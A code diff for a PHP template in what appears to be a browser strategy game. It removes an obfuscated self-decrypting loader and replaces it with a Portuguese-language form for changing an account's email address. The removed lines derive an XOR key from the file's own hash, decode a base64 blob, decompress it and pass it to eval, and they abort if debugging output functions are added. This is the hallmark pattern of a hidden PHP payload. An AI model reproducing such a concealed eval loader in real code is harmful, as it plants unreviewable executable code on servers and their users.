@@ -1,24 +1,26 @@
-<?php
-$abdbiitj="e92d31185cac64e9312f28c2eac6b67d";
-$baheogvh="570104540101050a030058565302510f0204015607010753070006505a01045c";
-$kzcodyty="SuKbY3+76AI63jb5GiZVr1iUiAnBb3huX5Xdw4jwVhF4lBCWvK2Bru+t9uw239uuDmMWrti9GrOw4UQcqulISibti+SdbZa6J2EJuCXoZJLS0jO2tUPQL/cz0TiVYFno3bqWSFjIhc5EyT6Jets/Dk80fD0EJnvCb7FFYRiJLJ0quXEJ1guIYNPz8F4YFVQlTXeae/J+7LU4L3RrujhUnWWY/GqZbTFv3H424T1CebGgqm68ecgSWrm/u1u/qmVNrvcawRP0Kkh8PglgVDJ680swwVCmVZQ0swMqMXsA387kAVqZqHQafPeO76+Iq2RYibx3jldzrZv0Vtg6cgJYVnx01PaFxApRa8XQC7d3jj2sAGby7yhQb/vKBwnBHqKrRwixNaLxzC+kMpqgpqwo/kkHpcAIoSa+LtbOrAGUZhFnh96FTCgnSi+eYgY9RUp5ttQaI5cpm+UpwZ0pXgoO3HkSwuuCb0jR5UnEmJoF6wrzF/9jEcPwn6FlGhKLcASy7s1e1AVJR0uL0/lWuO2Hv+7vo0CEPnYsSUL0TJ965Wczh20lnw==";
-$oaesrudu=file_get_contents(__FILE__);
-$rcqknsrqof=str_replace($kzcodyty,"",$oaesrudu);
-if(strpos($rcqknsrqof,"ec"."ho")!==false||strpos($rcqknsrqof,"pr"."int")!==false||strpos($rcqknsrqof,"var_"."dump")!==false||strpos($rcqknsrqof,"file_put_"."contents")!==false||strpos($rcqknsrqof,"fw"."rite")!==false){die();}
-$icggjobz=str_replace(array($abdbiitj,$baheogvh),array("SP_30174bb4","KP_d7261f1a"),$oaesrudu);
-$cyxjnalsk=md5($icggjobz);
-$rlbrqxcp=hex2bin($baheogvh);
-$zigkso="";
-$jffvdwqnd=strlen($cyxjnalsk);
-for($cmqgxhxjq=0;$cmqgxhxjq<$jffvdwqnd;$cmqgxhxjq++){
-$zigkso.=chr(ord($rlbrqxcp[$cmqgxhxjq])^ord($cyxjnalsk[$cmqgxhxjq]));
-}
-$lretwt=base64_decode($kzcodyty);
-$mjtutyu=strlen($lretwt);
-$urvkid="";
-$obkyjrxv=strlen($zigkso);
-for($cmqgxhxjq=0;$cmqgxhxjq<$mjtutyu;$cmqgxhxjq++){
-$urvkid.=$lretwt[$cmqgxhxjq]^$zigkso[$cmqgxhxjq%$obkyjrxv];
-}
-$zvqbefpd="gzun"."compress";
-eval('?>' . $zvqbefpd($urvkid) . '<?php ');
+<h3>Alterar o seu endereço de email</h3>
+
+<p>Pode alterar seu endereço de e-mail aqui, é necessário caso esqueça sua senha.</p>
+
+<b>Sua conta está registrada no endereço: </b><?= htmlspecialchars($user['email']) ?><br><br>
+
+<form method="post"
+    action="game.php?village=<?= $village['id'] ?>&screen=settings&mode=email&action=change_email&h=<?= $hkey ?>">
+    <table class="vis">
+        <tbody>
+            <tr>
+                <td><label for="passwd">Senha</label></td>
+                <td><input name="passwd" id="passwd" type="password"></td>
+            </tr>
+            <tr>
+                <td><label for="new_email">Novo endereço e-mail</label></td>
+                <td><input name="new_email" id="new_email" type="text"></td>
+            </tr>
+            <tr>
+                <td></td>
+                <td><input value="Mudar E-Mail" type="submit"></td>
+
+            </tr>
+        </tbody>
+    </table>
+</form>
